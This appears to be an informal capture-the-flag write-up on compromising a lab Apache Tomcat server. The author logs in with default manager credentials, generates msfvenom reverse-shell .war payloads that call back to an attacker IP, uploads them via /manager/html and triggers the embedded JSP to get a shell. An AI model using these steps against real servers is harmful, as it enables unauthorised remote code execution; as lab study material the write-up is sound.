tomcat
s3cret


upon trying i see we can login using these credentials

now here we see we can upload a .war file and upon uploading we can also executie the file


used below link to create a payload in .war format

https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom

paylaod used is

msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war


However it was not working so used the Ippsec video walkthrough to get hint


found out i had to change the paylaod and customize it for our target

Now as per walkthrough video

1.
â”Œâ”€â”€(rootðŸ’€kali)-[~/Desktop/THM]
â””â”€# msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.14.48 LPORT=4444 -f war > reverse.war 

2.

â”Œâ”€â”€(rootðŸ’€kali)-[~/Desktop/THM]
â””â”€# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.48 LPORT=4444 -f war > reverse2.war



both shells could work but since size of reverse2.war is smaller we should use the


started a reverse meterpreter tcp listener in metasploit 


and uploaded reverse2.war to target url

None of it is working


Found this video

This greatly explains the payload building though process for msfvenom

Okay realized my mistake 

there was an additional step.

.war is like a .zip file which containes multiple files in it


so the actual paylaod was a .jsp file inside the .war file


used below command to create a paylaod

â”Œâ”€â”€(rootðŸ’€kali)-[~/Desktop/THM]
â””â”€# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.48 LPORT=1337 -f war -o reverse.war  

used this command to see the name of .jsp file inside the .war file

â”Œâ”€â”€(rootðŸ’€kali)-[~/Desktop/THM]
â””â”€# jar tf reverse.war


now uploaded the .war fie on target url

http://10.10.10.95:8080/manager/html/

now here you can click on the filename you uplaoded 
in my case it was 
/reverse.war


click on it

after clicking on it you get an error but when you add the .jsp file name ahead of it like this



http://10.10.10.95:8080/reverse/bqkucuxmtb.jsp


you w\ill get a blank screen

this indiates the script was executed by the application 


got a reverse connection on port 1337


and got both flag in single file
